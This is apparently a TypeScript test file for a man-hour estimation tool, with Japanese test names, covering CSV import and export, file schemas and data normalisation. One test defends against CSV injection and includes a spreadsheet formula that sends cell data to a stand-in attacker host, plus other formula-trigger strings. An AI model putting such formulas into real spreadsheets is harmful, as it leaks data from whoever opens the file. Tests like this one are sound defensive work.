import assert from "node:assert/strict";
import { test } from "node:test";

import { at } from "../testing.ts";
import {
  createTask,
  emptyDocument,
  normalizeDocument,
  readBundle,
  readProjectFile,
  sampleDocument,
  sampleName,
  toBundle,
  toFile,
} from "./project.ts";
import { csvToTasks, projectToCsv } from "./storage.ts";
import { buildRows } from "./tree.ts";

test("CSV に書き出して読み直すと階層と値が戻る", () => {
  const project = sampleDocument();
  const csv = projectToCsv(buildRows(project.tasks));
  const restored = csvToTasks(csv);

  assert.equal(restored.length, project.tasks.length);
  const before = buildRows(project.tasks);
  const after = buildRows(restored);
  assert.deepEqual(
    after.map((row) => [row.task.name, row.depth, row.hasChildren]),
    before.map((row) => [row.task.name, row.depth, row.hasChildren]),
  );
  assert.deepEqual(
    after.filter((row) => !row.hasChildren).map((row) => row.rollup),
    before.filter((row) => !row.hasChildren).map((row) => row.rollup),
  );
});

test("カンマや引用符を含む名前も壊れない", () => {
  const project = emptyDocument();
  const tricky = '設計, 調査 "第1回"';
  project.tasks = csvToTasks(
    `level,name,group,priority,enabled,min,likely,max,startDate,progress,endDate\n` +
      `0,"${tricky.replace(/"/g, '""')}",設計,high,1,1,2,3,,0,\n`,
  );
  assert.equal(at(project.tasks, 0).name, tricky);

  const round = csvToTasks(projectToCsv(buildRows(project.tasks)));
  assert.equal(at(round, 0).name, tricky);
});

test("ヘッダが無い CSV も既定の並びとして読む", () => {
  const tasks = csvToTasks("0,調査,,normal,1,1,2,4,,0,\n1,下調べ,,low,1,1,2,3,,0,");
  assert.equal(tasks.length, 2);
  assert.equal(at(tasks, 1).parentId, at(tasks, 0).id);
  assert.equal(at(tasks, 1).priority, "low");
});

test("空行や末尾の改行を読み飛ばす", () => {
  const tasks = csvToTasks("level,name,min,likely,max\n0,A,1,2,3\n\n0,B,2,3,4\n\n");
  assert.deepEqual(
    tasks.map((task) => task.name),
    ["A", "B"],
  );
});

test("スキーマが違うファイルは受け付けない", () => {
  assert.equal(readProjectFile({ schema: "something-else" }), null);
  assert.equal(readProjectFile(null), null);
  assert.equal(readProjectFile("文字列"), null);
  assert.equal(readProjectFile([]), null);
});

test("書き出したファイルをそのまま読み戻せる", () => {
  const document = sampleDocument();
  const loaded = readProjectFile(JSON.parse(JSON.stringify(toFile("案件A", document))));
  assert.ok(loaded);
  assert.equal(loaded.name, "案件A");
  assert.equal(loaded.document.tasks.length, document.tasks.length);
  assert.equal(loaded.document.calendar.members.length, 2);
});

test("内容がトップレベルに並んだ古い形式も読める", () => {
  // 以前の版が書き出したファイルを開けなくしない。
  const old = {
    schema: "man-hour-calculator",
    version: 1,
    name: "旧形式",
    tasks: [{ id: "t1", name: "調査", min: "1", likely: "2", max: "3" }],
    calendar: {},
    settings: {},
  };
  const loaded = readProjectFile(old);
  assert.ok(loaded);
  assert.equal(loaded.name, "旧形式");
  assert.equal(loaded.document.tasks.length, 1);
  assert.equal(at(loaded.document.tasks, 0).name, "調査");
});

test("壊れた項目は既定値に落として読み込む", () => {
  const project = normalizeDocument({
    tasks: [
      { id: "a", name: "親", parentId: "存在しない" },
      { id: "b", name: "子", parentId: "a", min: "x", likely: 5, max: null, progress: 500 },
    ],
    calendar: {
      hoursPerPersonDay: 0,
      horizonDays: 99999,
      members: [{ id: "m1", name: "佐藤", workdays: "壊れている", breakMinutes: -5 }],
      events: [
        { id: "e1", startDate: "2026-09-21", startTime: "99:99", memberIds: ["m1", "nope"] },
      ],
    },
    settings: { engine: 42, bins: -1 },
  });

  // 見つからない親はトップレベルに戻す。
  assert.equal(at(project.tasks, 0).parentId, null);
  assert.equal(at(project.tasks, 1).parentId, "a");
  assert.equal(at(project.tasks, 1).min, "0", "数値として読めない値は 0");
  assert.equal(at(project.tasks, 1).likely, "5", "数値はそのまま文字列にする");
  assert.equal(at(project.tasks, 1).progress, 100, "進捗は 0〜100 に収める");
  assert.ok(project.calendar.hoursPerPersonDay > 0, "0 除算になる値は避ける");
  assert.ok(project.calendar.horizonDays <= 1830);

  // 人員の稼働予定が壊れていても既定の形に戻す。
  const member = at(project.calendar.members, 0);
  assert.equal(member.workdays.length, 7);
  assert.equal(member.breakMinutes, 0, "負の休憩は 0 に");
  // 読めない時刻は終日扱い、知らない参加者は落とす。
  const event = at(project.calendar.events, 0);
  assert.equal(event.startTime, null);
  assert.deepEqual(event.memberIds, ["m1"]);
  assert.equal(project.settings.engine, 0, "未知のエンジンは既定に倒す");
  assert.ok(project.settings.bins >= 4);
});

test("サンプルは一貫している", () => {
  const project = sampleDocument();
  const rows = buildRows(project.tasks);
  assert.ok(
    rows.some((row) => row.hasChildren),
    "親子関係を含む",
  );
  assert.ok(
    rows.every((row) => row.valid),
    "すべて妥当な見積もり",
  );
  assert.ok(new Set(project.tasks.map((task) => task.id)).size === project.tasks.length);
});

test("サンプルの中身は英語", () => {
  // 表示言語を切り替えても、データは英語のまま。英語で使う人の手元に
  // 最初から日本語が出ないようにする。
  const project = sampleDocument();
  const text = [
    sampleName(),
    ...project.tasks.map((task) => `${task.name} ${task.group}`),
    ...project.calendar.members.map((member) => member.name),
    ...project.calendar.events.map((event) => event.name),
  ].join(" ");
  const nonAscii = Array.from(text, (ch) => ch).filter((ch) => (ch.codePointAt(0) ?? 0) > 127);
  assert.deepEqual(nonAscii, [], `英語以外が混じっている: ${nonAscii.join("")}`);
});

test("まとめて書き出したファイルを読み戻せる", () => {
  const projects = [
    { name: "A", document: sampleDocument() },
    { name: "B", document: emptyDocument() },
  ];
  const loaded = readBundle(JSON.parse(JSON.stringify(toBundle(projects))));
  assert.ok(loaded);
  assert.equal(loaded.length, 2);
  assert.deepEqual(
    loaded.map((item) => item.name),
    ["A", "B"],
  );
  assert.equal(loaded[0]?.document.tasks.length, projects[0]?.document.tasks.length);
});

test("1 件ぶんとまとめたものは印で見分ける", () => {
  // 拡張子は目印でしかない。中身の schema だけで決める。
  const one = toFile("A", sampleDocument());
  assert.equal(readBundle(one), null, "1 件ぶんを束ねとして読まない");
  assert.equal(readProjectFile(toBundle([{ name: "A", document: sampleDocument() }])), null);
  assert.equal(readBundle({ schema: "man-hour-calculator-bundle", projects: [] }), null, "空");
  assert.equal(readBundle(null), null);
});

test("まとめたファイルの壊れた 1 件は既定値に落ちる", () => {
  // 外から来たファイルは何が入っているか分からない。1 件が壊れていても、
  // 残りが読めるなら読む。
  const loaded = readBundle({
    schema: "man-hour-calculator-bundle",
    version: 1,
    projects: [{ name: "A", document: sampleDocument() }, { document: "壊れている" }],
  });
  assert.ok(loaded);
  assert.equal(loaded.length, 2);
  const broken = at(loaded, 1);
  assert.equal(broken.name, "project 2");
  assert.deepEqual(broken.document.tasks, []);
});

/**
 * CSV インジェクション。`=`・`+`・`-`・`@` で始まるセルは、表計算ソフトで
 * 開いた瞬間に**式として実行される** (`=HYPERLINK(…)` で外へ送る、
 * `=cmd|…` で別のプログラムを起こす)。タスク名もグループも利用者が書いた
 * 文字列で、共有されたファイルを別の人が開く。
 */
test("式に見える名前は、表計算ソフトで式にならない形で書き出す", () => {
  const dangerous = [
    '=HYPERLINK("https://evil.example/?"&A1,"x")',
    "+1+1",
    "-2+3",
    "@SUM(1)",
    "\t=1",
    "\r=1",
  ];
  const tasks = dangerous.map((name) => ({
    ...createTask(),
    name,
    group: name,
  }));
  const csv = projectToCsv(buildRows(tasks));
  for (const line of csv.split("\n").slice(1)) {
    // level,name,group,... の name と group の欄。
    const cells = line.match(/("([^"]|"")*"|[^,]*)/g)?.filter((cell) => cell !== "") ?? [];
    for (const cell of cells.slice(1, 3)) {
      const text = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
      assert.ok(!/^[=+\-@\t\r]/.test(text), `式として読まれる: ${JSON.stringify(text)}`);
    }
  }
  // 読み戻すと元の名前に戻る (印のために足した ' は外す)。
  assert.deepEqual(
    csvToTasks(csv).map((task) => [task.name, task.group]),
    dangerous.map((name) => [name.trim(), name.trim()]),
  );
});

test("数値の欄はそのまま書く (負の数を式として潰さない)", () => {
  const task = {
    ...createTask(),
    name: "a",
    min: "-1",
    likely: "2",
    max: "3",
  };
  const csv = projectToCsv(buildRows([task]));
  assert.match(csv, /,-1,2,3,/);
});
